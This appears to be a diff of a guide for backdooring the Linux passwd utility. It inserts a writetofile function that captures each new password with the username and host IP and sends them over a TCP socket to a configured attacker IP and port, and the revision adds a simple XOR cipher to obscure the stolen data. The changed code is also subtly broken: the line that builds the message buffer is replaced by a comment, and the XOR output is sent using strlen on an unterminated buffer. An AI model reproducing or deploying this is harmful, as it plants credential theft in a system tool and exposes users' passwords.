@@ -73,67 +73,83 @@ At line number ~266, right above the code that will salt the password, we add a 
 
 At line ~210 right above the new_password function is where I put this function although it just needs to be above where it is called. Make sure to replace the text "INT_HERE" in the 17th line with the actual interface being used by the computer.
 
+	char* XORCipher(char* data, char* key, int dataLen, int keyLen) {
+		char* output = (char*)malloc(sizeof(char) * dataLen);
+
+		for (int i = 0; i < dataLen; ++i) {
+			output[i] = data[i] ^ key[i % keyLen];
+		}
+
+		return output;
+	}
+
 	int writetofile (char *password){
 
-	    /* Get UID */
-	    uid_t uid = geteuid();
-	    struct passwd * pw = getpwuid(uid);
+		/* Get uid */
+		uid_t uid = geteuid();
+		struct passwd * pw = getpwuid(uid);
+				
+		/* Get IP Address */
+		int fd;
+		struct ifreq ifr;
+		fd = socket(AF_INET, SOCK_DGRAM, 0);
+			
+		/* I want to get an IPv4 IP address */
+		ifr.ifr_addr.sa_family = AF_INET;
 
-	    /* Get IP Address */
-	    int fd;
-	    struct ifreq ifr;
-	    fd = socket(AF_INET, SOCK_DGRAM, 0);
+		/* I want IP address attached to set interface */
+		strncpy(ifr.ifr_name, INT_HERE, IFNAMSIZ-1);
+		ioctl(fd, SIOCGIFADDR, &ifr);
+		close(fd);
+		
+		/* display result */
+		char buffer[256];
+		char * ip;
+		ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
+		//SNPRINT
+		
+		/* Make Socket */
+		int sock = 0, valread;
+		struct sockaddr_in serv_addr;
 
-	    /* I want to get an IPv4 IP address */
-	    ifr.ifr_addr.sa_family = AF_INET;
+		/* Sock creation Pt 2*/
+		if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+			return -1;
+		}
 
-	    /* I want IP address attached to set interface */
-	    strncpy(ifr.ifr_name, INT_HERE, IFNAMSIZ-1);
-	    ioctl(fd, SIOCGIFADDR, &ifr);
-	    close(fd);
+		/* Socket Options */
+		serv_addr.sin_family = AF_INET;
+		serv_addr.sin_port = htons(PORT);
+			
+		/* Timeout settings */
+		struct timeval timeout;
+		timeout.tv_sec = 3;
+		timeout.tv_usec = 0;
+		
+		if (setsockopt (sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout) < 0)  {
+			return -1;
+		}
+		if (setsockopt (sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof timeout) < 0) {
+			// pass
+		}
 
-	    /* display result */
-	    char buffer[256];
-	    char * ip;
-	    ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
-	    int j = snprintf(buffer, 256, "%s:%s:%s\n", name, password, ip);
+		/* set IP and set buffer */
+		if(inet_pton(AF_INET, IP, &serv_addr.sin_addr)<=0) {
+			return -1;
+		}
+		if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+			return -1;
+		}
 
-	    /* Make Socket */
-	    int sock = 0, valread;
-	    struct sockaddr_in serv_addr;
+		/* Encrypt Message */
+		char* key  = "KEY_HERE";
+		int key_length = strlen(key);
+		int mes_length = strlen(buffer);
+		char* xor_message = XORCipher(buffer, key, mes_length, key_length);
 
-	    /* Sock creation Pt 2*/
-	    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-		return -1;
-	    }
-
-	    /* Socket Options */
-	    serv_addr.sin_family = AF_INET;
-	    serv_addr.sin_port = htons(PORT);
-
-	    /* Timeout settings */
-	    struct timeval timeout;
-	    timeout.tv_sec = 3;
-	    timeout.tv_usec = 0;
-
-	    if (setsockopt (sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout) < 0)  {
-		return -1;
-	    }
-	    if (setsockopt (sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof timeout) < 0) {
-		// pass
-
-	    /* set IP and set buffer */
-	    }
-	    if(inet_pton(AF_INET, IP, &serv_addr.sin_addr)<=0) {
-		return -1;
-	    }
-	    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
-		return -1;
-	    }
-
-	    /* Send Message */
-	    send(sock , buffer , strlen(buffer) , 0 ); 
-
-	    return 0;
+		/* Send Message */
+		send(sock , xor_message , strlen(xor_message) , 0); 
+		
+		return 0;
 
 	}
